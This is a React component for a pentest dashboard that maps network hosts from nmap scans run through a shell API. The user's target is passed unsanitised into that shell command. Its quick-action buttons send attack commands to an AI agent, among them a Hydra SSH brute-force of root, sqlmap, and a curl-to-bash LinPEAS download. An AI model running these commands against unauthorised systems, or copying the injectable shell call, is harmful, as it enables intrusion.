import { useCallback, useEffect, useRef, useState } from "react";
import { RefreshCw, Zap, X, Shield, AlertTriangle, Wifi, Globe, Server, Activity, ChevronRight } from "lucide-react";

const BASE_PATH = "";
const API_BASE = `${BASE_PATH}/api`;

interface HostPort { port: number; protocol: string; service: string; version?: string; state: "open" | "filtered" | "closed"; }
interface TopologyHost {
  id: string; ip: string; hostname?: string; mac?: string;
  os?: string; ports: HostPort[]; status: "up" | "down" | "unknown";
  riskLevel: "critical" | "high" | "medium" | "low" | "info";
  discoveredAt: number; lastSeen: number; tags: string[];
}
interface TopologyEdge { source: string; target: string; protocol?: string; }
interface Node { id: string; x: number; y: number; vx: number; vy: number; host: TopologyHost; }

const RISK_COLORS: Record<TopologyHost["riskLevel"], { fill: string; stroke: string; text: string; pulse: string }> = {
  critical: { fill: "#7f1d1d", stroke: "#ef4444", text: "#fca5a5", pulse: "rgba(239,68,68,0.4)" },
  high:     { fill: "#78350f", stroke: "#f97316", text: "#fdba74", pulse: "rgba(249,115,22,0.4)" },
  medium:   { fill: "#713f12", stroke: "#eab308", text: "#fde047", pulse: "rgba(234,179,8,0.3)" },
  low:      { fill: "#14532d", stroke: "#22c55e", text: "#86efac", pulse: "rgba(34,197,94,0.3)" },
  info:     { fill: "#1e3a5f", stroke: "#38bdf8", text: "#7dd3fc", pulse: "rgba(56,189,248,0.3)" },
};

function riskFromPorts(ports: HostPort[]): TopologyHost["riskLevel"] {
  const open = ports.filter(p => p.state === "open");
  const dangerous = ["22","23","3389","445","139","21","3306","5432","27017","6379","9200","8080","8443"];
  const hasDanger = open.some(p => dangerous.includes(String(p.port)));
  if (open.length > 20 || (hasDanger && open.length > 10)) return "critical";
  if (open.length > 10 || hasDanger) return "high";
  if (open.length > 5) return "medium";
  if (open.length > 0) return "low";
  return "info";
}

function parseNmapOutput(raw: string, triggerIp: string): TopologyHost | null {
  if (!raw || raw.includes("0 hosts up")) return null;
  const portLines = raw.match(/\d+\/\w+\s+open\s+\S+.*/g) ?? [];
  const ports: HostPort[] = portLines.map(line => {
    const m = line.match(/(\d+)\/(\w+)\s+(\w+)\s+(\S+)\s*(.*)/);
    if (!m) return null;
    return { port: parseInt(m[1]), protocol: m[2], state: m[3] as "open", service: m[4], version: m[5]?.trim() || undefined };
  }).filter(Boolean) as HostPort[];
  const hostnameM = raw.match(/Nmap scan report for (.+)/);
  const hostname = hostnameM?.[1]?.trim();
  const osM = raw.match(/OS details: (.+)/);
  const riskLevel = riskFromPorts(ports);
  return {
    id: triggerIp, ip: triggerIp,
    hostname: hostname !== triggerIp ? hostname : undefined,
    os: osM?.[1], ports,
    status: "up", riskLevel,
    discoveredAt: Date.now(), lastSeen: Date.now(), tags: [],
  };
}

export function NetworkTopologyMap({ onSendToAgent }: { onSendToAgent?: (msg: string) => void }) {
  const svgRef = useRef<SVGSVGElement>(null);
  const canvasW = 800, canvasH = 560;
  const [nodes, setNodes] = useState<Node[]>([]);
  const [edges] = useState<TopologyEdge[]>([]);
  const [selected, setSelected] = useState<TopologyHost | null>(null);
  const [scanning, setScanning] = useState(false);
  const [scanTarget, setScanTarget] = useState("127.0.0.1");
  const [scanLog, setScanLog] = useState<string[]>([]);
  const [autoLayout, setAutoLayout] = useState(true);
  const animRef = useRef<number>(0);
  const nodesRef = useRef<Node[]>([]);
  const dragging = useRef<{ id: string; ox: number; oy: number } | null>(null);

  // ── Physics simulation ────────────────────────────────────────────────────
  const tick = useCallback(() => {
    const ns = nodesRef.current;
    if (!autoLayout || ns.length < 2) return;
    const cx = canvasW / 2, cy = canvasH / 2;
    for (const a of ns) {
      // Gravity toward center
      a.vx += (cx - a.x) * 0.002;
      a.vy += (cy - a.y) * 0.002;
      // Repel from other nodes
      for (const b of ns) {
        if (a.id === b.id) continue;
        const dx = a.x - b.x, dy = a.y - b.y;
        const dist = Math.sqrt(dx * dx + dy * dy) || 1;
        if (dist < 160) {
          const f = (160 - dist) / dist * 0.4;
          a.vx += dx * f; a.vy += dy * f;
        }
      }
      // Damping
      a.vx *= 0.85; a.vy *= 0.85;
      a.x = Math.max(60, Math.min(canvasW - 60, a.x + a.vx));
      a.y = Math.max(60, Math.min(canvasH - 80, a.y + a.vy));
    }
    setNodes([...ns]);
    animRef.current = requestAnimationFrame(tick);
  }, [autoLayout]);

  useEffect(() => {
    if (autoLayout) { animRef.current = requestAnimationFrame(tick); }
    return () => cancelAnimationFrame(animRef.current);
  }, [autoLayout, tick, nodes.length]);

  // ── Add or update host ────────────────────────────────────────────────────
  const addHost = useCallback((host: TopologyHost) => {
    setNodes(prev => {
      const existing = prev.find(n => n.id === host.id);
      if (existing) {
        const updated = prev.map(n => n.id === host.id ? { ...n, host: { ...host, lastSeen: Date.now() } } : n);
        nodesRef.current = updated;
        return updated;
      }
      const angle = (prev.length * 137.5 * Math.PI) / 180;
      const r = 120 + prev.length * 30;
      const newNode: Node = {
        id: host.id, host,
        x: canvasW / 2 + Math.cos(angle) * r,
        y: canvasH / 2 + Math.sin(angle) * r,
        vx: 0, vy: 0,
      };
      const updated = [...prev, newNode];
      nodesRef.current = updated;
      return updated;
    });
  }, []);

  // ── Local host always present ─────────────────────────────────────────────
  useEffect(() => {
    const localHost: TopologyHost = {
      id: "127.0.0.1", ip: "127.0.0.1", hostname: "cybernova-server (local)",
      ports: [
        { port: 80, protocol: "tcp", service: "http", version: "nginx/Vite", state: "open" },
        { port: 8080, protocol: "tcp", service: "http-alt", version: "Express API", state: "open" },
        { port: 22981, protocol: "tcp", service: "http", version: "CyberNova Frontend", state: "open" },
      ],
      status: "up", riskLevel: "low",
      discoveredAt: Date.now(), lastSeen: Date.now(), tags: ["local","server","kali"],
    };
    addHost(localHost);
  }, [addHost]);

  // ── Scan via agent shell ──────────────────────────────────────────────────
  const runScan = useCallback(async (target: string) => {
    setScanning(true);
    setScanLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] Starting scan: ${target}`]);
    try {
      // First do a quick ping sweep
      const pingCmd = target.includes("/")
        ? `nmap -sn ${target} 2>&1 | grep -E "report for|Host is up" | head -20`
        : `nmap -sV --top-ports 100 ${target} 2>&1 | tail -50`;
      const r = await fetch(`${API_BASE}/shell/execute`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: pingCmd }),
        signal: AbortSignal.timeout(45000),
      });
      if (r.ok) {
        const d = await r.json() as { output?: string; stdout?: string; stderr?: string };
        const raw = d.output ?? d.stdout ?? d.stderr ?? "";
        setScanLog(prev => [...prev, `[output] ${raw.slice(0, 200)}`]);

        if (target.includes("/")) {
          // Parse multiple IPs from ping sweep
          const ips = raw.match(/report for (\S+)/g)?.map(m => m.replace("report for ", "")) ?? [];
          for (const ip of ips.slice(0, 10)) {
            const host: TopologyHost = {
              id: ip, ip, hostname: undefined, ports: [],
              status: "up", riskLevel: "info",
              discoveredAt: Date.now(), lastSeen: Date.now(), tags: ["discovered"],
            };
            addHost(host);
            setScanLog(prev => [...prev, `[+] Found host: ${ip}`]);
          }
        } else {
          const host = parseNmapOutput(raw, target);
          if (host) { addHost(host); setScanLog(prev => [...prev, `[+] Scanned ${target}: ${host.ports.filter(p=>p.state==="open").length} open ports`]); }
        }
      }
    } catch (e) {
      setScanLog(prev => [...prev, `[!] Scan error: ${String(e).slice(0, 100)}`]);
    } finally {
      setScanning(false);
    }
  }, [addHost]);

  // ── Auto-refresh: re-scan localhost every 30s to keep topology fresh ──────
  useEffect(() => {
    const t = setInterval(() => {
      if (!scanning) void runScan("127.0.0.1");
    }, 30_000);
    return () => clearInterval(t);
  }, [scanning, runScan]);

  // ── Drag handlers ─────────────────────────────────────────────────────────
  const onNodePointerDown = (e: React.PointerEvent, id: string) => {
    e.stopPropagation();
    const svg = svgRef.current; if (!svg) return;
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const { x, y } = pt.matrixTransform(svg.getScreenCTM()!.inverse());
    const node = nodesRef.current.find(n => n.id === id);
    if (node) dragging.current = { id, ox: x - node.x, oy: y - node.y };
    (e.target as Element).setPointerCapture(e.pointerId);
  };
  const onSvgPointerMove = (e: React.PointerEvent) => {
    if (!dragging.current) return;
    const svg = svgRef.current; if (!svg) return;
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const { x, y } = pt.matrixTransform(svg.getScreenCTM()!.inverse());
    const { id, ox, oy } = dragging.current;
    const updated = nodesRef.current.map(n => n.id === id ? { ...n, x: x - ox, y: y - oy, vx: 0, vy: 0 } : n);
    nodesRef.current = updated;
    setNodes([...updated]);
  };
  const onSvgPointerUp = () => { dragging.current = null; };

  const riskBadge: Record<TopologyHost["riskLevel"], string> = {
    critical: "bg-red-500/20 text-red-300 border-red-500/40",
    high: "bg-orange-500/20 text-orange-300 border-orange-500/40",
    medium: "bg-amber-500/20 text-amber-300 border-amber-500/40",
    low: "bg-emerald-500/20 text-emerald-300 border-emerald-500/40",
    info: "bg-sky-500/20 text-sky-300 border-sky-500/40",
  };

  return (
    <div className="flex flex-col h-full bg-[#010805] text-xs font-mono overflow-hidden">
      {/* ── Header ── */}
      <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-emerald-900/40 bg-black/40">
        <Wifi className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
        <span className="text-emerald-300 font-bold text-[11px]">خريطة الشبكة الحية — Network Topology</span>
        <span className="text-muted-foreground ml-1">({nodes.length} host{nodes.length !== 1 ? "s" : ""})</span>
        <div className="flex items-center gap-1 ms-auto">
          {(["critical","high","medium","low","info"] as const).map(r => (
            <span key={r} className={`text-[8px] px-1.5 py-0.5 rounded border ${riskBadge[r]}`}>
              {nodes.filter(n=>n.host.riskLevel===r).length} {r}
            </span>
          ))}
        </div>
      </div>

      {/* ── Scan bar ── */}
      <div className="shrink-0 flex items-center gap-1.5 px-3 py-1.5 border-b border-emerald-900/30 bg-black/20">
        <Globe className="w-3 h-3 text-emerald-600 shrink-0" />
        <input
          value={scanTarget}
          onChange={e => setScanTarget(e.target.value)}
          placeholder="IP or CIDR (e.g. 192.168.1.1 or 192.168.1.0/24)"
          className="flex-1 bg-transparent border border-emerald-900/50 rounded px-2 py-0.5 text-[10px] text-emerald-200 placeholder:text-emerald-900 focus:outline-none focus:border-emerald-500/50"
        />
        <button onClick={() => void runScan(scanTarget)} disabled={scanning}
          className="flex items-center gap-1 px-2 py-1 rounded bg-emerald-900/40 border border-emerald-500/40 text-emerald-200 hover:bg-emerald-800/40 disabled:opacity-40 transition text-[10px]">
          {scanning ? <Activity className="w-3 h-3 animate-pulse" /> : <Zap className="w-3 h-3" />}
          {scanning ? "جارٍ الفحص..." : "Scan"}
        </button>
        <button onClick={() => void runScan("192.168.1.0/24")} disabled={scanning}
          className="text-[9px] px-1.5 py-1 rounded border border-cyan-700/40 text-cyan-400 hover:bg-cyan-900/20 disabled:opacity-40 transition">
          Subnet /24
        </button>
        <button onClick={() => setAutoLayout(v => !v)}
          className={`text-[9px] px-1.5 py-1 rounded border transition ${autoLayout ? "border-violet-500/40 text-violet-300 bg-violet-900/20" : "border-border/30 text-muted-foreground"}`}>
          Physics {autoLayout ? "ON" : "OFF"}
        </button>
        <button onClick={() => { setNodes([]); nodesRef.current = []; setScanLog([]); setSelected(null); }}
          className="text-[9px] px-1.5 py-1 rounded border border-rose-700/30 text-rose-500 hover:bg-rose-900/20 transition">
          <RefreshCw className="w-3 h-3" />
        </button>
      </div>

      {/* ── Main area: SVG + sidebar ── */}
      <div className="flex-1 flex min-h-0">
        {/* SVG topology canvas */}
        <div className="flex-1 relative overflow-hidden">
          <svg
            ref={svgRef}
            width="100%" height="100%"
            viewBox={`0 0 ${canvasW} ${canvasH}`}
            className="w-full h-full"
            style={{ background: "radial-gradient(ellipse at center, #010d05 0%, #000800 100%)" }}
            onPointerMove={onSvgPointerMove}
            onPointerUp={onSvgPointerUp}
          >
            {/* Grid */}
            <defs>
              <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
                <path d="M 40 0 L 0 0 0 40" fill="none" stroke="rgba(34,197,94,0.04)" strokeWidth="1" />
              </pattern>
              <filter id="glow"><feGaussianBlur stdDeviation="3" result="coloredBlur" /><feMerge><feMergeNode in="coloredBlur" /><feMergeNode in="SourceGraphic" /></feMerge></filter>
              <filter id="glow-strong"><feGaussianBlur stdDeviation="6" result="coloredBlur" /><feMerge><feMergeNode in="coloredBlur" /><feMergeNode in="SourceGraphic" /></feMerge></filter>
            </defs>
            <rect width={canvasW} height={canvasH} fill="url(#grid)" />

            {/* Scan ring animation */}
            {scanning && (
              <g transform={`translate(${canvasW/2},${canvasH/2})`}>
                {[60,120,200].map((r, i) => (
                  <circle key={r} r={r} fill="none" stroke="rgba(34,197,94,0.15)" strokeWidth="1"
                    style={{ animation: `ping ${1.5 + i * 0.5}s ease-in-out infinite`, transformOrigin: "center" }} />
                ))}
              </g>
            )}

            {/* Edges */}
            {nodes.map(n => nodes.filter(m => m.id !== n.id && Math.hypot(n.x - m.x, n.y - m.y) < 250).map(m => (
              <line key={`${n.id}-${m.id}`}
                x1={n.x} y1={n.y} x2={m.x} y2={m.y}
                stroke="rgba(34,197,94,0.08)" strokeWidth="1" strokeDasharray="4 4" />
            )))}

            {/* Nodes */}
            {nodes.map(node => {
              const col = RISK_COLORS[node.host.riskLevel];
              const isSelected = selected?.id === node.host.id;
              const openPorts = node.host.ports.filter(p => p.state === "open").length;
              const r = 18 + Math.min(openPorts * 1.5, 14);
              return (
                <g key={node.id} transform={`translate(${node.x},${node.y})`}
                  style={{ cursor: "pointer" }}
                  onClick={() => setSelected(selected?.id === node.host.id ? null : node.host)}
                  onPointerDown={e => onNodePointerDown(e, node.id)}>
                  {/* Pulse ring */}
                  <circle r={r + 8} fill="none" stroke={col.stroke} strokeWidth="0.5" opacity="0.3"
                    style={{ animation: "ping 2s ease-in-out infinite" }} />
                  {/* Outer ring */}
                  {isSelected && <circle r={r + 12} fill="none" stroke={col.stroke} strokeWidth="1.5" opacity="0.8" filter="url(#glow)" />}
                  {/* Node body */}
                  <circle r={r} fill={col.fill} stroke={col.stroke} strokeWidth={isSelected ? 2 : 1} filter={isSelected ? "url(#glow-strong)" : "url(#glow)"} />
                  {/* Icon area */}
                  <text textAnchor="middle" dominantBaseline="central" fontSize={r * 0.8} fill={col.text} style={{ userSelect: "none" }}>
                    {node.host.tags.includes("local") ? "🖥" : node.host.ports.some(p => p.service === "http" || p.service === "https") ? "🌐" : "🔷"}
                  </text>
                  {/* IP label */}
                  <text y={r + 12} textAnchor="middle" fontSize="9" fill={col.text} fontFamily="monospace" style={{ userSelect: "none" }}>
                    {node.host.ip}
                  </text>
                  {/* Hostname */}
                  {node.host.hostname && (
                    <text y={r + 22} textAnchor="middle" fontSize="7.5" fill="rgba(255,255,255,0.5)" fontFamily="monospace" style={{ userSelect: "none" }}>
                      {node.host.hostname.slice(0, 18)}
                    </text>
                  )}
                  {/* Port count badge */}
                  {openPorts > 0 && (
                    <g transform={`translate(${r - 4},${-r + 4})`}>
                      <circle r="7" fill={col.stroke} opacity="0.9" />
                      <text textAnchor="middle" dominantBaseline="central" fontSize="7" fill="#000" fontWeight="bold" style={{ userSelect: "none" }}>{openPorts}</text>
                    </g>
                  )}
                </g>
              );
            })}

            {/* Center label if empty */}
            {nodes.length === 0 && (
              <text x={canvasW / 2} y={canvasH / 2} textAnchor="middle" fontSize="13" fill="rgba(34,197,94,0.3)" fontFamily="monospace">
                أدخل IP وابدأ الفحص لرسم الشبكة...
              </text>
            )}
          </svg>

          {/* Scan log overlay */}
          {scanLog.length > 0 && (
            <div className="absolute bottom-2 left-2 right-2 max-h-20 overflow-y-auto bg-black/80 border border-emerald-900/40 rounded p-1.5 text-[9px] font-mono text-emerald-400 space-y-0.5">
              {scanLog.slice(-8).map((l, i) => <div key={i}>{l}</div>)}
            </div>
          )}
        </div>

        {/* ── Host detail panel ── */}
        {selected && (
          <div className="w-64 shrink-0 border-l border-emerald-900/30 bg-black/60 overflow-y-auto flex flex-col">
            <div className="flex items-center justify-between px-3 py-2 border-b border-emerald-900/30 bg-black/40">
              <div>
                <div className="font-bold text-emerald-200 text-[11px]">{selected.ip}</div>
                {selected.hostname && <div className="text-[9px] text-muted-foreground">{selected.hostname}</div>}
              </div>
              <button onClick={() => setSelected(null)} className="text-muted-foreground hover:text-rose-400 transition">
                <X className="w-3.5 h-3.5" />
              </button>
            </div>
            <div className="p-2 space-y-2 flex-1">
              {/* Risk badge */}
              <div className={`text-[9px] px-2 py-0.5 rounded border text-center font-bold ${riskBadge[selected.riskLevel]}`}>
                {selected.riskLevel.toUpperCase()} RISK
              </div>
              {/* OS */}
              {selected.os && (
                <div className="text-[9px] text-cyan-300 bg-cyan-900/20 border border-cyan-800/30 rounded px-2 py-1">
                  OS: {selected.os}
                </div>
              )}
              {/* Tags */}
              {selected.tags.length > 0 && (
                <div className="flex flex-wrap gap-1">
                  {selected.tags.map(t => <span key={t} className="text-[8px] px-1 rounded bg-primary/10 text-primary/70">{t}</span>)}
                </div>
              )}
              {/* Ports */}
              <div>
                <div className="text-[9px] text-muted-foreground mb-1 flex items-center justify-between">
                  <span>منافذ مفتوحة ({selected.ports.filter(p=>p.state==="open").length})</span>
                  <Server className="w-3 h-3" />
                </div>
                <div className="space-y-0.5 max-h-48 overflow-y-auto">
                  {selected.ports.filter(p => p.state === "open").map(p => (
                    <div key={p.port} className="flex items-center gap-1.5 text-[9px] font-mono bg-emerald-900/10 rounded px-1.5 py-0.5">
                      <span className="text-emerald-400 font-bold w-10 shrink-0">{p.port}</span>
                      <span className="text-emerald-300">{p.service}</span>
                      {p.version && <span className="text-muted-foreground truncate text-[8px]">{p.version}</span>}
                    </div>
                  ))}
                  {selected.ports.filter(p=>p.state==="open").length === 0 && (
                    <div className="text-muted-foreground text-[9px] text-center py-2">لا منافذ مفتوحة</div>
                  )}
                </div>
              </div>

              {/* Quick actions */}
              <div className="border-t border-emerald-900/30 pt-2 space-y-1">
                <div className="text-[9px] text-muted-foreground mb-1">إجراءات سريعة</div>
                {[
                  { label: "🔍 Nmap Full Scan", cmd: `[EXECUTE: nmap -sV -sC -O -T4 --top-ports 1000 ${selected.ip} -oN /tmp/nmap_${selected.ip.replace(/\./g,"_")}.txt 2>&1 | tail -40]` },
                  { label: "🕷 Nikto Scan", cmd: `[EXECUTE: nikto -h http://${selected.ip} -C all 2>&1 | tail -30]` },
                  { label: "💉 SQLMap", cmd: `[EXECUTE: sqlmap -u "http://${selected.ip}/?id=1" --dbs --batch 2>&1 | tail -20]` },
                  { label: "🔑 Hydra SSH", cmd: `[EXECUTE: hydra -l root -P /usr/share/wordlists/rockyou.txt -t 8 ssh://${selected.ip} 2>&1 | head -20]` },
                  { label: "🔥 Gobuster", cmd: `[EXECUTE: gobuster dir -u http://${selected.ip} -w /usr/share/wordlists/dirb/common.txt -t 30 2>&1 | tail -20]` },
                  { label: "📋 LinPEAS" , cmd: `نفّذ LinPEAS على ${selected.ip} للبحث عن PrivEsc:\n[EXECUTE: curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | bash 2>&1 | head -80]` },
                ].map(a => (
                  <button key={a.label} onClick={() => onSendToAgent?.(a.cmd)}
                    className="w-full text-right text-[9px] px-2 py-1 rounded border border-emerald-900/40 text-emerald-300 hover:bg-emerald-900/20 hover:border-emerald-500/40 transition flex items-center gap-1">
                    <ChevronRight className="w-2.5 h-2.5 shrink-0" />
                    {a.label}
                  </button>
                ))}
              </div>

              {/* Metadata */}
              <div className="text-[8px] text-muted-foreground border-t border-emerald-900/20 pt-2 space-y-0.5">
                <div>اكتُشف: {new Date(selected.discoveredAt).toLocaleTimeString()}</div>
                <div>آخر رؤية: {new Date(selected.lastSeen).toLocaleTimeString()}</div>
              </div>
            </div>
          </div>
        )}
      </div>

      <style>{`
        @keyframes ping { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:0.3; transform:scale(1.3); } }
      `}</style>
    </div>
  );
}
